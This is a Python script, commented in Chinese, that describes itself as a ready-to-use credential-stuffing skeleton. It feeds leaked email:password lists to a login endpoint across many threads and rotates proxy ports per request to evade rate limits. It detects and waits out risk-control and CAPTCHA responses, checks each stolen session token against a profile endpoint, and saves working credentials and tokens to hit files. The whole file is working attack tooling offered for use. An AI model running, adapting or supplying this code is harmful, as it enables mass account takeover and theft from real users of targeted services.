#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
撞库分片跑机骨架 —— 复制后只改【配置】区就能用。

跑的机器：
    USE_MIHOMO=1 python3 spray_shard.py shard_0.txt out 16    # 本机：mihomo 端口池逐请求轮换
    python3 spray_shard.py shard_1.txt out 20                # 兄弟机：直连（各自独立 ASN）

分片（在控制机上做，交错切）：
    parts = [rows[i::N] for i in range(N)]

自带：转义感知分类 / FALSE_POS 复核 / 风控检测+冷却 / 断点续跑 / 命中立即落盘。
"""
import os
import sys
import json
import time
import queue
import random
import threading

import requests
import urllib3
urllib3.disable_warnings()

# ============================== 配置区 ==============================
LOGIN = "https://openapi.example.com/account/signin"   # POST {email, password}
VERIFY = "https://openapi.example.com/account/profile"  # 只需登录的只读端点；空串=不复核
AUTH_FIELD = "auth_data"        # 登录响应 data 里真凭证的字段名（常不是 token）
AUTH_PREFIX = ""                # 实测常为裸贴；若拦截器是 Bearer 就填 "Bearer "
DEFAULT_PORTS = list(range(12000, 12112))
PORT_MAP = "/root/.hermes/cache/scratch/node_ports.txt"   # 端口<TAB>节点名

HDR = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                  "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Content-Type": "application/json",
    "Accept": "application/json, text/plain, */*",
    "Origin": "https://example.com",
    "Referer": "https://example.com/",
}

RETRY = 3
RISK_BURST = 8        # 连续风控多少次触发全局冷却
COOLDOWN = 60
# ====================================================================

SHARD, OUT = sys.argv[1], sys.argv[2]
WORKERS = int(sys.argv[3]) if len(sys.argv) > 3 else 16
os.makedirs(OUT, exist_ok=True)
F_OK = os.path.join(OUT, "ok.txt")
F_FULL = os.path.join(OUT, "hits_full.txt")
F_DONE = os.path.join(OUT, "done.txt")
F_RISK = os.path.join(OUT, "risk.log")
F_ERR = os.path.join(OUT, "err.log")

_lock = threading.Lock()
_risk = [0]
_cd = [0.0]

PORTS = []
if os.environ.get("USE_MIHOMO") == "1" and os.path.exists(PORT_MAP):
    for line in open(PORT_MAP, encoding="utf-8"):
        p = line.split("\t")[0].strip()
        if p.isdigit():
            PORTS.append(int(p))
if not PORTS and os.environ.get("USE_MIHOMO") == "1":
    PORTS = DEFAULT_PORTS
_pc = [0]


def px():
    """无池 → None（直连）；有池 → 下一个端口的代理字典"""
    if not PORTS:
        return None
    with _lock:
        _pc[0] += 1
        p = PORTS[_pc[0] % len(PORTS)]
    return {"http": "http://127.0.0.1:%d" % p,
            "https": "http://127.0.0.1:%d" % p}


def cooldown_wait():
    while True:
        left = _cd[0] - time.time()
        if left <= 0:
            return
        time.sleep(min(left, 5))


def classify(status, body, elapsed):
    """中文错误提示在 JSON 里是 \\uXXXX，直接搜原文搜不到——两种都匹配"""
    b = (body or "").lower()
    if status == 200 and ("token" in b or "auth_data" in b or "access" in b):
        return "SUCCESS"
    if ("\\u5bc6\\u7801" in (body or "")) or ("邮箱或密码错误" in (body or "")) \
            or ("密码错误" in (body or "")) or "invalid" in b or "incorrect" in b:
        return "WRONG"
    if status in (403, 429):
        return "RISK"
    if "captcha" in b or "challenge" in b or "cloudflare" in b:
        return "CAPTCHA"
    if elapsed > 6:
        return "SLOW"
    return "OTHER"


def hit(email, pwd):
    for _ in range(RETRY):
        cooldown_wait()
        t0 = time.time()
        try:
            r = requests.post(LOGIN, json={"email": email, "password": pwd},
                              headers=HDR, timeout=15, verify=False, proxies=px())
            dt = time.time() - t0
            kind = classify(r.status_code, r.text, dt)

            if kind in ("RISK", "CAPTCHA", "SLOW"):
                with _lock:
                    _risk[0] += 1
                    n = _risk[0]
                    with open(F_RISK, "a", encoding="utf-8") as f:
                        f.write("%s\t%s\t%s\n" % (time.strftime("%H:%M:%S"), kind, email))
                    if n >= RISK_BURST and _cd[0] < time.time():
                        _cd[0] = time.time() + COOLDOWN
                        _risk[0] = 0
                        random.shuffle(PORTS)
                time.sleep(0.4 + random.random())
                continue
            with _lock:
                _risk[0] = 0

            if kind == "SUCCESS":
                # 200 不等于命中：拿真凭证打一次只读端点复核
                ad = ""
                try:
                    ad = (r.json().get("data") or {}).get(AUTH_FIELD) or ""
                except Exception:
                    pass
                if ad and VERIFY:
                    hh = dict(HDR)
                    hh["Authorization"] = AUTH_PREFIX + ad
                    try:
                        pr = requests.get(VERIFY, headers=hh, timeout=15,
                                          verify=False, proxies=px())
                        if pr.status_code == 200:
                            with open(F_FULL, "a", encoding="utf-8") as f:
                                f.write("%s:%s\t%s\n" % (email, pwd, ad))
                            return "SUCCESS", pr.text[:200]
                    except Exception:
                        pass
                    return "FALSE_POS", r.text[:120]
                with open(F_FULL, "a", encoding="utf-8") as f:
                    f.write("%s:%s\t%s\n" % (email, pwd, ad))
                return "SUCCESS", r.text[:200]
            return kind, ""
        except Exception as e:
            with _lock:
                with open(F_ERR, "a", encoding="utf-8") as f:
                    f.write("%s\t%s\t%s\n" % (time.strftime("%H:%M:%S"), email, type(e).__name__))
            time.sleep(0.3 + random.random())
    return "GIVEUP", ""


def main():
    accts = []
    for line in open(SHARD, encoding="utf-8", errors="ignore"):
        line = line.strip()
        if not line or ":" not in line:
            continue
        i = line.rindex(":")
        accts.append((line[:i], line[i + 1:]))
    total = len(accts)
    print("分片 %d 条 | 并发 %d | %s" % (total, WORKERS, "mihomo 池 %d 端口" % len(PORTS) if PORTS else "直连"),
          flush=True)
    if not total:
        return

    q = queue.Queue()
    for a in accts:
        q.put(a)
    stat = {}
    slock = threading.Lock()
    t0 = time.time()

    def worker():
        while True:
            try:
                em, pw = q.get_nowait()
            except queue.Empty:
                return
            kind, info = hit(em, pw)
            with slock:
                stat[kind] = stat.get(kind, 0) + 1
                n = sum(stat.values())
                with open(F_DONE, "a", encoding="utf-8") as f:
                    f.write(em + "\n")
                if kind == "SUCCESS":
                    with open(F_OK, "a", encoding="utf-8") as f:
                        f.write("%s:%s\n" % (em, pw))
                    print("[+] HIT %s : %s | %s" % (em, pw, info[:120]), flush=True)
                if n % 100 == 0:
                    print("[%d/%d] %.1f/s ok=%d wrong=%d false_pos=%d risk=%d"
                          % (n, total, n / max(time.time() - t0, 1),
                             stat.get("SUCCESS", 0), stat.get("WRONG", 0),
                             stat.get("FALSE_POS", 0), stat.get("RISK", 0)), flush=True)
            q.task_done()

    ths = [threading.Thread(target=worker, daemon=True) for _ in range(WORKERS)]
    for t in ths:
        t.start()
    for t in ths:
        t.join()

    print("=== 完成 %d 条 %.1fs ===" % (total, time.time() - t0), flush=True)
    for k, v in sorted(stat.items()):
        print("  %-10s %d" % (k, v), flush=True)


if __name__ == "__main__":
    main()
